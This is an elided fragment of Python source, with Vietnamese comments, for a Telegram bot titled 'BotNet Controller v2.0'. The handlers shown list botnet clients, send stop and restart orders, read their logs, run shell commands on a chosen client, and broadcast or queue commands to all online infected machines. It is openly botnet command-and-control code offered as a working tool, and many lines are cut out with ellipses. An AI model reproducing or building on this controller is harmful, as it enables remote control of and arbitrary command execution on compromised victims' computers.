...
def start(update, context):
    ...
    update.message.reply_text("🤖 **BotNet Controller v2.0**\nQuản lý botnet qua Telegram", 
...
def button_handler(update, context):
    ...
    if data == "list":
        ...
        if cid in bot_data["clients"]:
            ...
            save_data(bot_data)
            query.edit_message_text(f"✅ STOP sent to {cid[:16]}")
        else:
        ...
        if cid in bot_data["clients"]:
            ...
            save_data(bot_data)
            query.edit_message_text(f"✅ RESTART sent to {cid[:16]}")
        else:
            query.edit_message_text("❌ Client not found")
        ...
        if cid in bot_data["clients"] and bot_data["clients"][cid]["logs"]:
            ...
            query.edit_message_text(f"📄 **Logs {cid[:16]}:**\n```\n{logs[:3500]}\n```", parse_mode="Markdown")
        else:
            query.edit_message_text(f"📭 No logs for {cid[:16]}")
    
    elif data.startswith("shell_"):
        cid = data[6:]
        context.user_data["shell_client"] = cid
        query.edit_message_text(f"⌨️ Nhập lệnh shell cho {cid[:16]}:\n`/cmd <lệnh>`", parse_mode="Markdown")
...
└─ Tasks pending: {len([t for t in bot_data.get('tasks',[]) if t['status']=='pending'])}"""
        ...
        query.edit_message_text("⌨️ Tạo task cho ALL clients:\n`/task <lệnh>`", parse_mode="Markdown")
    
    elif data == "broadcast":
        query.edit_message_text("📢 Gửi lệnh broadcast:\n`/broadcast <lệnh>`", parse_mode="Markdown")
    
    elif data == "refresh":
        query.edit_message_text("🔄 Refreshed!")
...
def cmd_handler(update, context):
    ...
    if not cid:
        update.message.reply_text("⚠️ Chọn client bằng nút Shell trước")
        return
    ...
    if cid in bot_data["clients"]:
        ...
        save_data(bot_data)
        update.message.reply_text(f"✅ Sent to {cid[:16]}: `{cmd}`", parse_mode="Markdown")
    else:
        update.message.reply_text("❌ Client not found")
...
def task_handler(update, context):
    if update.effective_user.id != ADMIN_ID:
        ...
        return
    if not context.args:
        update.message.reply_text("⚠️ /task <lệnh>")
        return
    ...
    save_data(bot_data)
    update.message.reply_text(f"✅ Task created: `{cmd}`\nTarget: all clients", parse_mode="Markdown")
...
def broadcast_handler(update, context):
    if update.effective_user.id != ADMIN_ID:
        ...
        return
    if not context.args:
        update.message.reply_text("⚠️ /broadcast <lệnh>")
        return
    ...
    for cid in bot_data["clients"]:
        if bot_data["clients"][cid]["status"] == "online":
            ...
            count += 1
    save_data(bot_data)
    update.message.reply_text(f"📢 Broadcast `{cmd}` to {count} clients", parse_mode="Markdown")
...
if __name__ == "__main__":
    ...
    # Telegram Bot (cách cũ, không async)
    updater = Updater(BOT_TOKEN)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("cmd", cmd_handler))
    dp.add_handler(CommandHandler("task", task_handler))
